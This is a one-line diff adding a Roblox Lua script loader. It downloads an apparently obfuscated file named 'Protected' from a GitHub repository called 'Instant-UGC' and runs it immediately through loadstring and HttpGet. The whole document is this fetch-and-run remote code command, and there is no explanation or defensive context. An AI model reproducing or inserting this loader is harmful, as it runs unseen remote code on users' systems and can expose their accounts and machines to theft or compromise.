@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kei-0-zen/Instant-UGC/2b53035ebb1582b0c3dc0bfbeab3a4efc3ded437/Protected_1730568726903114.lua.txt"))()           
